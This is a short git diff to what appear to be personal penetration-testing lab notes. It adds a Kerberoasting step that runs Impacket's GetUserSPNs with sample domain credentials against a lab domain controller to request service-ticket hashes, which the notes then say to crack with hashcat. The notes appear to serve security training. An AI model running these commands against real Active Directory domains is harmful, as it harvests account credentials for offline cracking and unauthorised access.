@@ -99,6 +99,8 @@ Transfer loot back to kali:
 
 ## Kerbreroasting (Service Account Attack (want to attack members of high value group )
 1. Once we have some username + password, we ask the Domian Controller for TGS (since we can request TGT) and try to crack TGS hash.
+2. `locate  GetUserSPNs.py`  `cd /usr/share/doc/python3-impacket/examples/` `python GetUserSPNs.py offsec.local/nathan:"abc123//" -dc-ip=192.168.125.57 -request`
+
 ```
 impacket-GetUserSPNs <IP or hostname>/<username>:<password> -request [add -request if SPN is found]
 [save hash and crack with hashcat]
